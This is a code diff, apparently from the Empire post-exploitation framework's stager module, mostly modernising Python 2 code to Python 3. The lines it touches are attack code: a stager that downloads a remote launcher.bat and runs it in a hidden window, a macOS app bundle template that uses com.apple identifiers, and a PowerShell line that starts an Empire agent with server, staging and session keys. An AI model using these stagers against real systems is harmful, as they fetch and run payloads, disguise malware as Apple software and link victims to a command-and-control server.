@@ -11,7 +11,6 @@ The Stagers() class in instantiated in ./server.py by the main menu and includes
     generate_dylib() - generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application
 
 """
-from __future__ import absolute_import, division
 
 import base64
 import errno
@@ -21,7 +20,6 @@ import shutil
 import string
 import subprocess
 import zipfile
-from builtins import chr, object, str, zip
 from itertools import cycle
 
 import donut
@@ -37,7 +35,7 @@ from . import helpers
 log = logging.getLogger(__name__)
 
 
-class Stagers(object):
+class Stagers:
     def __init__(self, MainMenu, args):
         self.mainMenu = MainMenu
         self.args = args
@@ -53,7 +51,7 @@ class Stagers(object):
         stager = (
             'wget "'
             + webFile
-            + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
+            + r'" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
         )
         if encode:
             return helpers.powershell_launcher(stager, launcher)
@@ -514,15 +512,15 @@ class Stagers(object):
     <key>CFBundleDevelopmentRegion</key>
     <string>en</string>
     <key>CFBundleExecutable</key>
-    <string>%s</string>
+    <string>{}</string>
     <key>CFBundleIconFile</key>
-    <string>%s</string>
+    <string>{}</string>
     <key>CFBundleIdentifier</key>
-    <string>com.apple.%s</string>
+    <string>com.apple.{}</string>
     <key>CFBundleInfoDictionaryVersion</key>
     <string>6.0</string>
     <key>CFBundleName</key>
-    <string>%s</string>
+    <string>{}</string>
     <key>CFBundlePackageType</key>
     <string>APPL</string>
     <key>CFBundleShortVersionString</key>
@@ -563,7 +561,7 @@ class Stagers(object):
     <string>NSApplication</string>
 </dict>
 </plist>
-""" % (
+""".format(
                 AppName,
                 iconfile,
                 AppName,
@@ -658,7 +656,7 @@ class Stagers(object):
         return package
 
     def generate_jar(self, launcherCode):
-        with open(self.mainMenu.installPath + "/data/misc/Run.java", "r") as f:
+        with open(self.mainMenu.installPath + "/data/misc/Run.java") as f:
             javacode = f.read()
         javacode = javacode.replace("LAUNCHER", launcherCode)
         jarpath = self.mainMenu.installPath + "/data/misc/classes/com/installer/apple/"
@@ -787,9 +785,13 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             )
 
             if options["Language"]["Value"] == "powershell":
-                launch_code = (
-                    "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';"
-                    % (host, staging_key, session_key, session_id)
+                launch_code = "\nInvoke-Empire -Servers @('{}') -StagingKey '{}' -SessionKey '{}' -SessionID '{}' -WorkingHours '{}' -KillDate '{}';".format(
+                    host,
+                    staging_key,
+                    session_key,
+                    session_id,
+                    working_hours,
+                    kill_date,
                 )
                 full_agent = comms_code + "\n" + agent_code + "\n" + launch_code
                 return full_agent
